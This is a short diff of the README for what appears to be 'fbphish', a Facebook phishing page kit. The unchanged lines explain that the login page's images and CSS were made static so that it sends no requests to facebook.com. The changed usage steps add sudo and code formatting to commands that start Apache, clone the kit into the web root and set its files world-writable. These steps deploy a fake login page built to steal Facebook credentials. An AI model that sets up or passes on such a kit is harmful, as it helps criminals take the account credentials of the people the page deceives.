@@ -8,9 +8,9 @@ which also means that every image and css code is loaded dynamically and randoml
 I just collected all the images and the css code and i made them static to the code so it doesn't also require to send any requests to facebook.com.
  
 ## Usage
-1. service apache2 start
-2. git clone https://github.com/0xyg3n/fbphish /var/www/html
-3. chmod 777 /var/www/html/* 
+1. `sudo service apache2 start`
+2. `git clone https://github.com/0xyg3n/fbphish /var/www/html`
+3. `sudo chmod 777 /var/www/html/* `
 
 
 ##Troubleshooting
